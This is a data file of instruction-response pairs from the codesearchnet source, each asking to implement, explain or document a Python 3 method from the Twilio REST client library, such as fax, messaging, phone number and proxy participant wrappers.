{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngenerate an instance context for the terminating_sip_domain", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: TerminatingSipDomainContext for this TerminatingSipDomainInstance\n        :rtype: twilio.rest.trunking.v1.trunk.terminating_sip_domain.TerminatingSipDomainContext\n        \"\"\"\n        if self._context is None:\n            self._context = TerminatingSipDomainContext(\n                self._version,\n                trunk_sid=self._solution['trunk_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_instance(self, payload):\n        return AssistantInitiationActionsInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n        )", "response": "Build an instance of AssistantInitiationActionsInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nupdates the AssistantInitiationActionsInstance :param dict initiation_actions: The initiation_actions :returns: Updated AssistantInitiationActionsInstance :rtype: twilio.rest.preview.understand.assistant.assistant_initiation_actions.AssistantInitiationActionsInstance", "response": "def update(self, initiation_actions=values.unset):\n        \"\"\"\n        Update the AssistantInitiationActionsInstance\n\n        :param dict initiation_actions: The initiation_actions\n\n        :returns: Updated AssistantInitiationActionsInstance\n        :rtype: twilio.rest.preview.understand.assistant.assistant_initiation_actions.AssistantInitiationActionsInstance\n        \"\"\"\n        data = values.of({'InitiationActions': serialize.object(initiation_actions), })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return AssistantInitiationActionsInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = AssistantInitiationActionsContext(\n                self._version,\n                assistant_sid=self._solution['assistant_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the assistant_initiation_actions"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nupdating the AssistantInitiationActionsInstance :param dict initiation_actions: The initiation_actions :returns: Updated AssistantInitiationActionsInstance :rtype: twilio.rest.preview.understand.assistant.assistant_initiation_actions.AssistantInitiationActionsInstance", "response": "def update(self, initiation_actions=values.unset):\n        \"\"\"\n        Update the AssistantInitiationActionsInstance\n\n        :param dict initiation_actions: The initiation_actions\n\n        :returns: Updated AssistantInitiationActionsInstance\n        :rtype: twilio.rest.preview.understand.assistant.assistant_initiation_actions.AssistantInitiationActionsInstance\n        \"\"\"\n        return self._proxy.update(initiation_actions=initiation_actions, )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create(self, from_=values.unset, attributes=values.unset,\n               date_created=values.unset, date_updated=values.unset,\n               last_updated_by=values.unset, body=values.unset,\n               media_sid=values.unset):\n        \"\"\"\n        Create a new MessageInstance\n\n        :param unicode from_: The identity of the new message's author\n        :param unicode attributes: A valid JSON string that contains application-specific data\n        :param datetime date_created: The ISO 8601 date and time in GMT when the resource was created\n        :param datetime date_updated: The ISO 8601 date and time in GMT when the resource was updated\n        :param unicode last_updated_by: The Identity of the User who last updated the Message\n        :param unicode body: The message to send to the channel\n        :param unicode media_sid:  The Media Sid to be attached to the new Message\n\n        :returns: Newly created MessageInstance\n        :rtype: twilio.rest.chat.v2.service.channel.message.MessageInstance\n        \"\"\"\n        data = values.of({\n            'From': from_,\n            'Attributes': attributes,\n            'DateCreated': serialize.iso8601_datetime(date_created),\n            'DateUpdated': serialize.iso8601_datetime(date_updated),\n            'LastUpdatedBy': last_updated_by,\n            'Body': body,\n            'MediaSid': media_sid,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return MessageInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            channel_sid=self._solution['channel_sid'],\n        )", "response": "Create a new MessageInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef list(self, order=values.unset, limit=None, page_size=None):\n        return list(self.stream(order=order, limit=limit, page_size=page_size, ))", "response": "Streams the MessageInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconstructs a MessageContext :param sid: The unique string that identifies the resource :returns: twilio.rest.chat.v2.service.channel.message.MessageContext :rtype: twilio.rest.chat.v2.service.channel.message.MessageContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a MessageContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.chat.v2.service.channel.message.MessageContext\n        :rtype: twilio.rest.chat.v2.service.channel.message.MessageContext\n        \"\"\"\n        return MessageContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            channel_sid=self._solution['channel_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_instance(self, payload):\n        return MessageInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            channel_sid=self._solution['channel_sid'],\n        )", "response": "Build an instance of MessageInstance"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, body=values.unset, attributes=values.unset,\n               date_created=values.unset, date_updated=values.unset,\n               last_updated_by=values.unset, from_=values.unset):\n        \"\"\"\n        Update the MessageInstance\n\n        :param unicode body: The message to send to the channel\n        :param unicode attributes: A valid JSON string that contains application-specific data\n        :param datetime date_created: The ISO 8601 date and time in GMT when the resource was created\n        :param datetime date_updated: The ISO 8601 date and time in GMT when the resource was updated\n        :param unicode last_updated_by: The Identity of the User who last updated the Message, if applicable\n        :param unicode from_: The identity of the message's author\n\n        :returns: Updated MessageInstance\n        :rtype: twilio.rest.chat.v2.service.channel.message.MessageInstance\n        \"\"\"\n        return self._proxy.update(\n            body=body,\n            attributes=attributes,\n            date_created=date_created,\n            date_updated=date_updated,\n            last_updated_by=last_updated_by,\n            from_=from_,\n        )", "response": "Update the MessageInstance s related attributes"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef fetch(self, country_code=values.unset, type=values.unset,\n              add_ons=values.unset, add_ons_data=values.unset):\n        \"\"\"\n        Fetch a PhoneNumberInstance\n\n        :param unicode country_code: The ISO country code of the phone number\n        :param unicode type: The type of information to return\n        :param unicode add_ons: The unique_name of an Add-on you would like to invoke\n        :param dict add_ons_data: Data specific to the add-on you would like to invoke\n\n        :returns: Fetched PhoneNumberInstance\n        :rtype: twilio.rest.lookups.v1.phone_number.PhoneNumberInstance\n        \"\"\"\n        params = values.of({\n            'CountryCode': country_code,\n            'Type': serialize.map(type, lambda e: e),\n            'AddOns': serialize.map(add_ons, lambda e: e),\n        })\n\n        params.update(serialize.prefixed_collapsible_map(add_ons_data, 'AddOns'))\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return PhoneNumberInstance(self._version, payload, phone_number=self._solution['phone_number'], )", "response": "Fetch a PhoneNumberInstance\n\n        :param unicode country_code: The ISO country code of the phone number\n        :param unicode type: The type of information to return\n        :param unicode add_ons: The unique_name of an Add-on you would like to invoke\n        :param dict add_ons_data: Data specific to the add-on you would like to invoke\n\n        :returns: Fetched PhoneNumberInstance\n        :rtype: twilio.rest.lookups.v1.phone_number.PhoneNumberInstance"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _proxy(self):\n        if self._context is None:\n            self._context = PhoneNumberContext(self._version, phone_number=self._solution['phone_number'], )\n        return self._context", "response": "Generate an instance context for the phone_number"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nfetches a PhoneNumberInstance :param unicode country_code: The ISO country code of the phone number :param unicode type: The type of information to return :param unicode add_ons: The unique_name of an Add-on you would like to invoke :param dict add_ons_data: Data specific to the add-on you would like to invoke :returns: Fetched PhoneNumberInstance :rtype: twilio.rest.lookups.v1.phone_number.PhoneNumberInstance", "response": "def fetch(self, country_code=values.unset, type=values.unset,\n              add_ons=values.unset, add_ons_data=values.unset):\n        \"\"\"\n        Fetch a PhoneNumberInstance\n\n        :param unicode country_code: The ISO country code of the phone number\n        :param unicode type: The type of information to return\n        :param unicode add_ons: The unique_name of an Add-on you would like to invoke\n        :param dict add_ons_data: Data specific to the add-on you would like to invoke\n\n        :returns: Fetched PhoneNumberInstance\n        :rtype: twilio.rest.lookups.v1.phone_number.PhoneNumberInstance\n        \"\"\"\n        return self._proxy.fetch(\n            country_code=country_code,\n            type=type,\n            add_ons=add_ons,\n            add_ons_data=add_ons_data,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create(self, api_version=values.unset, friendly_name=values.unset,\n               sms_application_sid=values.unset, sms_fallback_method=values.unset,\n               sms_fallback_url=values.unset, sms_method=values.unset,\n               sms_url=values.unset, status_callback=values.unset,\n               status_callback_method=values.unset,\n               voice_application_sid=values.unset,\n               voice_caller_id_lookup=values.unset,\n               voice_fallback_method=values.unset, voice_fallback_url=values.unset,\n               voice_method=values.unset, voice_url=values.unset,\n               emergency_status=values.unset, emergency_address_sid=values.unset,\n               trunk_sid=values.unset, identity_sid=values.unset,\n               address_sid=values.unset, voice_receive_mode=values.unset,\n               phone_number=values.unset, area_code=values.unset):\n        \"\"\"\n        Create a new IncomingPhoneNumberInstance\n\n        :param unicode api_version: The API version to use for incoming calls made to the new phone number\n        :param unicode friendly_name: A string to describe the new phone number\n        :param unicode sms_application_sid: The SID of the application to handle SMS messages\n        :param unicode sms_fallback_method: HTTP method used with sms_fallback_url\n        :param unicode sms_fallback_url: The URL we call when an error occurs while executing TwiML\n        :param unicode sms_method: The HTTP method to use with sms url\n        :param unicode sms_url: The URL we should call when the new phone number receives an incoming SMS message\n        :param unicode status_callback: The URL we should call to send status information to your application\n        :param unicode status_callback_method: HTTP method we should use to call status_callback\n        :param unicode voice_application_sid: The SID of the application to handle the new phone number\n        :param bool voice_caller_id_lookup: Whether to lookup the caller's name\n        :param unicode voice_fallback_method: The HTTP method used with voice_fallback_url\n        :param unicode voice_fallback_url: The URL we will call when an error occurs in TwiML\n        :param unicode voice_method: The HTTP method used with the voice_url\n        :param unicode voice_url: The URL we should call when the phone number receives a call\n        :param IncomingPhoneNumberInstance.EmergencyStatus emergency_status: Status determining whether the new phone number is enabled for emergency calling\n        :param unicode emergency_address_sid: The emergency address configuration to use for emergency calling\n        :param unicode trunk_sid: SID of the trunk to handle calls to the new phone number\n        :param unicode identity_sid: The SID of the Identity resource to associate with the new phone number\n        :param unicode address_sid: The SID of the Address resource associated with the phone number\n        :param IncomingPhoneNumberInstance.VoiceReceiveMode voice_receive_mode: Incoming call type: fax or voice\n        :param unicode phone_number: The phone number to purchase in E.164 format\n        :param unicode area_code: The desired area code for the new phone number\n\n        :returns: Newly created IncomingPhoneNumberInstance\n        :rtype: twilio.rest.api.v2010.account.incoming_phone_number.IncomingPhoneNumberInstance\n        \"\"\"\n        data = values.of({\n            'PhoneNumber': phone_number,\n            'AreaCode': area_code,\n            'ApiVersion': api_version,\n            'FriendlyName': friendly_name,\n            'SmsApplicationSid': sms_application_sid,\n            'SmsFallbackMethod': sms_fallback_method,\n            'SmsFallbackUrl': sms_fallback_url,\n            'SmsMethod': sms_method,\n            'SmsUrl': sms_url,\n            'StatusCallback': status_callback,\n            'StatusCallbackMethod': status_callback_method,\n            'VoiceApplicationSid': voice_application_sid,\n            'VoiceCallerIdLookup': voice_caller_id_lookup,\n            'VoiceFallbackMethod': voice_fallback_method,\n            'VoiceFallbackUrl': voice_fallback_url,\n            'VoiceMethod': voice_method,\n            'VoiceUrl': voice_url,\n            'EmergencyStatus': emergency_status,\n            'EmergencyAddressSid': emergency_address_sid,\n            'TrunkSid': trunk_sid,\n            'IdentitySid': identity_sid,\n            'AddressSid': address_sid,\n            'VoiceReceiveMode': voice_receive_mode,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return IncomingPhoneNumberInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n        )", "response": "Creates a new IncomingPhoneNumberInstance of the specified type"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\naccess the mobile :returns: twilio.rest.api.v2010.account.incoming_phone_number.mobile.MobileList :rtype: twilio.rest.api.v2010.account.incoming_phone_number.mobile.MobileList", "response": "def mobile(self):\n        \"\"\"\n        Access the mobile\n\n        :returns: twilio.rest.api.v2010.account.incoming_phone_number.mobile.MobileList\n        :rtype: twilio.rest.api.v2010.account.incoming_phone_number.mobile.MobileList\n        \"\"\"\n        if self._mobile is None:\n            self._mobile = MobileList(self._version, account_sid=self._solution['account_sid'], )\n        return self._mobile"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\naccesses the toll_free :returns: twilio.rest.api.v2010.account.incoming_phone_number.toll_free.TollFreeList :rtype: twilio.rest.api.v2010.account.incoming_phone_number.toll_free.TollFreeList", "response": "def toll_free(self):\n        \"\"\"\n        Access the toll_free\n\n        :returns: twilio.rest.api.v2010.account.incoming_phone_number.toll_free.TollFreeList\n        :rtype: twilio.rest.api.v2010.account.incoming_phone_number.toll_free.TollFreeList\n        \"\"\"\n        if self._toll_free is None:\n            self._toll_free = TollFreeList(self._version, account_sid=self._solution['account_sid'], )\n        return self._toll_free"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nconstructing a IncomingPhoneNumberContext :param sid: The unique string that identifies the resource :returns: twilio.rest.api.v2010.account.incoming_phone_number.IncomingPhoneNumberContext :rtype: twilio.rest.api.v2010.account.incoming_phone_number.IncomingPhoneNumberContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a IncomingPhoneNumberContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.incoming_phone_number.IncomingPhoneNumberContext\n        :rtype: twilio.rest.api.v2010.account.incoming_phone_number.IncomingPhoneNumberContext\n        \"\"\"\n        return IncomingPhoneNumberContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nbuilding an instance of IncomingPhoneNumberInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of IncomingPhoneNumberInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.incoming_phone_number.IncomingPhoneNumberInstance\n        :rtype: twilio.rest.api.v2010.account.incoming_phone_number.IncomingPhoneNumberInstance\n        \"\"\"\n        return IncomingPhoneNumberInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef assigned_add_ons(self):\n        if self._assigned_add_ons is None:\n            self._assigned_add_ons = AssignedAddOnList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                resource_sid=self._solution['sid'],\n            )\n        return self._assigned_add_ons", "response": "Access the assigned_add_ons\n\n        :returns: twilio.rest.api.v2010.account.incoming_phone_number.assigned_add_on.AssignedAddOnList\n        :rtype: twilio.rest.api.v2010.account.incoming_phone_number.assigned_add_on.AssignedAddOnList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngenerating an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: IncomingPhoneNumberContext for this IncomingPhoneNumberInstance\n        :rtype: twilio.rest.api.v2010.account.incoming_phone_number.IncomingPhoneNumberContext\n        \"\"\"\n        if self._context is None:\n            self._context = IncomingPhoneNumberContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nupdate the IncomingPhoneNumberInstance record with the new values.", "response": "def update(self, account_sid=values.unset, api_version=values.unset,\n               friendly_name=values.unset, sms_application_sid=values.unset,\n               sms_fallback_method=values.unset, sms_fallback_url=values.unset,\n               sms_method=values.unset, sms_url=values.unset,\n               status_callback=values.unset, status_callback_method=values.unset,\n               voice_application_sid=values.unset,\n               voice_caller_id_lookup=values.unset,\n               voice_fallback_method=values.unset, voice_fallback_url=values.unset,\n               voice_method=values.unset, voice_url=values.unset,\n               emergency_status=values.unset, emergency_address_sid=values.unset,\n               trunk_sid=values.unset, voice_receive_mode=values.unset,\n               identity_sid=values.unset, address_sid=values.unset):\n        \"\"\"\n        Update the IncomingPhoneNumberInstance\n\n        :param unicode account_sid: The SID of the Account that created the resource to update\n        :param unicode api_version: The API version to use for incoming calls made to the phone number\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode sms_application_sid: Unique string that identifies the application\n        :param unicode sms_fallback_method: HTTP method used with sms_fallback_url\n        :param unicode sms_fallback_url: The URL we call when an error occurs while executing TwiML\n        :param unicode sms_method: The HTTP method to use with sms_url\n        :param unicode sms_url: The URL we should call when the phone number receives an incoming SMS message\n        :param unicode status_callback: The URL we should call to send status information to your application\n        :param unicode status_callback_method: The HTTP method we should use to call status_callback\n        :param unicode voice_application_sid: The SID of the application to handle the phone number\n        :param bool voice_caller_id_lookup: Whether to lookup the caller's name\n        :param unicode voice_fallback_method: The HTTP method used with fallback_url\n        :param unicode voice_fallback_url: The URL we will call when an error occurs in TwiML\n        :param unicode voice_method: The HTTP method used with the voice_url\n        :param unicode voice_url: The URL we should call when the phone number receives a call\n        :param IncomingPhoneNumberInstance.EmergencyStatus emergency_status: Whether the phone number is enabled for emergency calling\n        :param unicode emergency_address_sid: The emergency address configuration to use for emergency calling\n        :param unicode trunk_sid: SID of the trunk to handle phone calls to the phone number\n        :param IncomingPhoneNumberInstance.VoiceReceiveMode voice_receive_mode: Incoming call type: fax or voice\n        :param unicode identity_sid: Unique string that identifies the identity associated with number\n        :param unicode address_sid: The SID of the Address resource associated with the phone number\n\n        :returns: Updated IncomingPhoneNumberInstance\n        :rtype: twilio.rest.api.v2010.account.incoming_phone_number.IncomingPhoneNumberInstance\n        \"\"\"\n        return self._proxy.update(\n            account_sid=account_sid,\n            api_version=api_version,\n            friendly_name=friendly_name,\n            sms_application_sid=sms_application_sid,\n            sms_fallback_method=sms_fallback_method,\n            sms_fallback_url=sms_fallback_url,\n            sms_method=sms_method,\n            sms_url=sms_url,\n            status_callback=status_callback,\n            status_callback_method=status_callback_method,\n            voice_application_sid=voice_application_sid,\n            voice_caller_id_lookup=voice_caller_id_lookup,\n            voice_fallback_method=voice_fallback_method,\n            voice_fallback_url=voice_fallback_url,\n            voice_method=voice_method,\n            voice_url=voice_url,\n            emergency_status=emergency_status,\n            emergency_address_sid=emergency_address_sid,\n            trunk_sid=trunk_sid,\n            voice_receive_mode=voice_receive_mode,\n            identity_sid=identity_sid,\n            address_sid=address_sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef create(self, alpha_sender):\n        data = values.of({'AlphaSender': alpha_sender, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return AlphaSenderInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Create a new AlphaSenderInstance"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get(self, sid):\n        return AlphaSenderContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )", "response": "Constructs a AlphaSenderContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.messaging.v1.service.alpha_sender.AlphaSenderContext\n        :rtype: twilio.rest.messaging.v1.service.alpha_sender.AlphaSenderContext"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nbuild an instance of AlphaSenderInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of AlphaSenderInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.messaging.v1.service.alpha_sender.AlphaSenderInstance\n        :rtype: twilio.rest.messaging.v1.service.alpha_sender.AlphaSenderInstance\n        \"\"\"\n        return AlphaSenderInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _proxy(self):\n        if self._context is None:\n            self._context = AlphaSenderContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nstreaming FaxInstance records from the API as a generator.", "response": "def stream(self, from_=values.unset, to=values.unset,\n               date_created_on_or_before=values.unset,\n               date_created_after=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Streams FaxInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param unicode from_: Retrieve only those faxes sent from this phone number\n        :param unicode to: Retrieve only those faxes sent to this phone number\n        :param datetime date_created_on_or_before: Retrieve only faxes created on or before this date\n        :param datetime date_created_after: Retrieve only faxes created after this date\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.fax.v1.fax.FaxInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            from_=from_,\n            to=to,\n            date_created_on_or_before=date_created_on_or_before,\n            date_created_after=date_created_after,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef list(self, from_=values.unset, to=values.unset,\n             date_created_on_or_before=values.unset,\n             date_created_after=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists FaxInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode from_: Retrieve only those faxes sent from this phone number\n        :param unicode to: Retrieve only those faxes sent to this phone number\n        :param datetime date_created_on_or_before: Retrieve only faxes created on or before this date\n        :param datetime date_created_after: Retrieve only faxes created after this date\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.fax.v1.fax.FaxInstance]\n        \"\"\"\n        return list(self.stream(\n            from_=from_,\n            to=to,\n            date_created_on_or_before=date_created_on_or_before,\n            date_created_after=date_created_after,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Streams FaxInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef page(self, from_=values.unset, to=values.unset,\n             date_created_on_or_before=values.unset,\n             date_created_after=values.unset, page_token=values.unset,\n             page_number=values.unset, page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of FaxInstance records from the API.\n        Request is executed immediately\n\n        :param unicode from_: Retrieve only those faxes sent from this phone number\n        :param unicode to: Retrieve only those faxes sent to this phone number\n        :param datetime date_created_on_or_before: Retrieve only faxes created on or before this date\n        :param datetime date_created_after: Retrieve only faxes created after this date\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of FaxInstance\n        :rtype: twilio.rest.fax.v1.fax.FaxPage\n        \"\"\"\n        params = values.of({\n            'From': from_,\n            'To': to,\n            'DateCreatedOnOrBefore': serialize.iso8601_datetime(date_created_on_or_before),\n            'DateCreatedAfter': serialize.iso8601_datetime(date_created_after),\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return FaxPage(self._version, response, self._solution)", "response": "Retrieve a single page of FaxInstance records from the API. Request is executed immediately"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef create(self, to, media_url, quality=values.unset,\n               status_callback=values.unset, from_=values.unset,\n               sip_auth_username=values.unset, sip_auth_password=values.unset,\n               store_media=values.unset, ttl=values.unset):\n        \"\"\"\n        Create a new FaxInstance\n\n        :param unicode to: The phone number to receive the fax\n        :param unicode media_url: The Twilio-hosted URL of the PDF that contains the fax\n        :param FaxInstance.Quality quality: The quality of this fax\n        :param unicode status_callback: The URL we should call to send status information to your application\n        :param unicode from_: The number the fax was sent from\n        :param unicode sip_auth_username: The username for SIP authentication\n        :param unicode sip_auth_password: The password for SIP authentication\n        :param bool store_media: Whether to store a copy of the sent media\n        :param unicode ttl: How long in minutes to try to send the fax\n\n        :returns: Newly created FaxInstance\n        :rtype: twilio.rest.fax.v1.fax.FaxInstance\n        \"\"\"\n        data = values.of({\n            'To': to,\n            'MediaUrl': media_url,\n            'Quality': quality,\n            'StatusCallback': status_callback,\n            'From': from_,\n            'SipAuthUsername': sip_auth_username,\n            'SipAuthPassword': sip_auth_password,\n            'StoreMedia': store_media,\n            'Ttl': ttl,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return FaxInstance(self._version, payload, )", "response": "Create a new FaxInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef media(self):\n        if self._media is None:\n            self._media = FaxMediaList(self._version, fax_sid=self._solution['sid'], )\n        return self._media", "response": "Access the media\n\n        :returns: twilio.rest.fax.v1.fax.fax_media.FaxMediaList\n        :rtype: twilio.rest.fax.v1.fax.fax_media.FaxMediaList"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = FaxContext(self._version, sid=self._solution['sid'], )\n        return self._context", "response": "Generate an instance context for the fax instance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update(self, status=values.unset):\n        return self._proxy.update(status=status, )", "response": "Updates the FaxInstance with the specified status"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef create(self, identifier, friendly_name=values.unset,\n               proxy_identifier=values.unset, proxy_identifier_sid=values.unset):\n        \"\"\"\n        Create a new ParticipantInstance\n\n        :param unicode identifier: The phone number of the Participant\n        :param unicode friendly_name: The string that you assigned to describe the participant\n        :param unicode proxy_identifier: The proxy phone number to use for the Participant\n        :param unicode proxy_identifier_sid: The Proxy Identifier Sid\n\n        :returns: Newly created ParticipantInstance\n        :rtype: twilio.rest.proxy.v1.service.session.participant.ParticipantInstance\n        \"\"\"\n        data = values.of({\n            'Identifier': identifier,\n            'FriendlyName': friendly_name,\n            'ProxyIdentifier': proxy_identifier,\n            'ProxyIdentifierSid': proxy_identifier_sid,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ParticipantInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            session_sid=self._solution['session_sid'],\n        )", "response": "Create a new ParticipantInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_instance(self, payload):\n        return ParticipantInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            session_sid=self._solution['session_sid'],\n        )", "response": "Build an instance of ParticipantInstance"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef message_interactions(self):\n        if self._message_interactions is None:\n            self._message_interactions = MessageInteractionList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                session_sid=self._solution['session_sid'],\n                participant_sid=self._solution['sid'],\n            )\n        return self._message_interactions", "response": "Access the message_interactions\n\n        :returns: twilio.rest.proxy.v1.service.session.participant.message_interaction.MessageInteractionList\n        :rtype: twilio.rest.proxy.v1.service.session.participant.message_interaction.MessageInteractionList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ngenerate an instance context for the participant", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: ParticipantContext for this ParticipantInstance\n        :rtype: twilio.rest.proxy.v1.service.session.participant.ParticipantContext\n        \"\"\"\n        if self._context is None:\n            self._context = ParticipantContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                session_sid=self._solution['session_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef create(self, friendly_name):\n        data = values.of({'FriendlyName': friendly_name, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return CredentialListInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Create a new CredentialListInstance"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get(self, sid):\n        return CredentialListContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )", "response": "Constructs a CredentialListContext\n\n        :param sid: Fetch by unique credential list Sid\n\n        :returns: twilio.rest.api.v2010.account.sip.credential_list.CredentialListContext\n        :rtype: twilio.rest.api.v2010.account.sip.credential_list.CredentialListContext"}
